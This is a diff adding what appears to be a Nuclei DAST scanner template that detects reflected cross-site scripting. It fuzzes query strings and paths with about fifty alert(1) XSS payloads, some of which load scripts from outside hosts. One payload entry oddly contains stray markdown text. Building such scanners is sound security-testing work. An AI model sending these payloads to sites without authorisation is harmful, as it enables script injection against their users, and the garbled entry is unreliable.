@@ -1,0 +1,103 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form><input autofocus>"
+        - "<q onclick=\"alert(1)\">test</q>"
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form>"
+        - "<power1 onmouseenter=\"alert(1)\">test</power1>"
+        - "<b id=x tabindex=1 ondeactivate=alert(1)></b><script>document.onbeforedeactivate=alert(2)</script><input autofocus>"
+        - "<details onbeforepaste=\"alert(1)\" contenteditable>test</details>"
+        - "<script onmouseover=\"alert(1)\">test</script>"
+        - "<div draggable=\"true\" id=\"drag1\">drag me</div><div id=\"drop1\" ondragenter=\"alert(1)\"></div>"
+        - "<p oncontextmenu=\"alert(1)\">test</p>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></iframe>"
+        - "<sup onmouseout=\"alert(1)\">test</sup>"
+        - "<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></plaintext>"
+        - "<blockquote onkeydown=\"alert(1)\" contenteditable>test</blockquote>"
+        - "<dl oncopy=\"alert(1)\" contenteditable>test</dl>"
+        - "<track id=x tabindex=1 onbeforeactivate=alert(1)></track>"
+        - "<template id=x tabindex=1 onbeforeactivate=alert(1)></template><div id=y contenteditable>test</div>"
+        - "<script src=about:javascript://www.google.com/script.js></script>"
+        - "<code><form onblur=alert(1)></form>"
+        - "<plaintext oncopy=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<script src=\"http://www.google.com/blank.gif\" id=\"fuzzelement1\"></script><link href=\"http://www.google.com/blank.gif\" rel=\"icon\" type=\"image/gif\" id=\"fuzzelement2\"><object data=http://www.google.com/blank.gif width=10 height=10 style=\"filter:progid:DXImageTransform.Microsoft.AlphaImageGenereater(sizingMethod=scale, src='http://www.google.com/blank.gif')\"></object><div id=x tabindex=1 onfocusout=alert(1)></div>"
+        - "<sub onmouseout=\"alert(1)\">test</sub>"
+        - "<form action=\"http://xss-1.com\" onkeypress=\"alert(1)\">test</form><input type=submit id=x tabindex=1 onbeforeactivate=alert(1)>"
+        - "<script>alert(1)</script><br />"
+        - "<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><slot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></slot>"
+        - "<IMG SRC=x onerror=\"alert(1)\">"
+        - "<code onclick=\"alert(1)\">test</code>"
+        - "<input src=\"javascript:alert(1)\">"
+        - "<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></fieldset>"
+        - "<sub onbeforecopy=\"alert(1)\" contenteditable>test</sub><input data-handlepaste>test</data-handlepaste>"
+        - "<tr onclick=\"alert(1)\">test</tr>"
+        - "<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><output id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></output>"
+        - "&lt;script&gt;//&lt;/script&gt;&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}&lt;/style&gt;&lt;noframes id=x style=\"position:absolute;\" onanimationend=\"alert(1)\">"
+        - "<style>@keyframes x{}</style><script style=\"animation-name:x\" onanimationend=\"alert(1)\"></script>"
+        - "<style>:target {transform: rotate(180deg);}</style><table id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></table>"
+        - "<frame onload=alert(1)></frame>"
+        - "<script>\\xE2\\x88\\x92document.\\x73cript = \\x22alert(1)\\x22;\\x09</script><input id=x tabindex=1 onfocusin=\\xE2\\x80\\xA8javascript:(function(e){e.fortune = 'You will be wealthy.';})(window.event);> <output onfocusout=\\xE2\\x88\\x92javascript:\\xE2\\x80\\x9Calert(document.fortune)\\x22 id=y></output>"
+        - "<paint-on-rotate>
+
+### Description:
+An XSS Payload.
+
+### XSSF:
+
+<iframe id=x tabindex=1 onfocusin=alert(1)></iframe>"
+        - "<b id=x tabindex=1 onbeforeactivate=alert(1)></b>"
+        - "<datalist id=x tabindex=1 onactivate=alert(1)></datalist><input id=y autofocus>"
+        - "<svg><foreignObject xmlns=\"http://www.w3.org/1999/xhtml\"><input autocomplete=\"email\" name=\"usermail\" onbeforepaste=\"alert(1)\" contenteditable>test</input></foreignObject></svg>"
+        - "<div id=\"xss1\" onbeforecopy=\"alert(1)\" contenteditable>test</div><input type=hidden id=x value=<script>document.onpaste=alert(1)</script>"
+        - "<style>@keyframes x{}</style><thead style=\"animation-name:x\" onanimationend=\"alert(1)\"></thead>"
+        - "<pre style=\"transition-duration:1s\" ontransitionend=alert(1)></pre>"
+        - "<video src=\"data:x,\\\"x\\\"><html><title>x</title></html></video>"
+        - "<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext>"
+        - "<script src=\"http://randsome.com/somescript.js\">alert(1);</script>\\"
+        - "<svg><text path=\"m50 100v80h60v-40h20v10z\" id=x tabindex=1 onmousemove=alert(1)></text></svg>"
+        - "<style>:target {transform: rotate(180deg);}</style><table id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></table>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
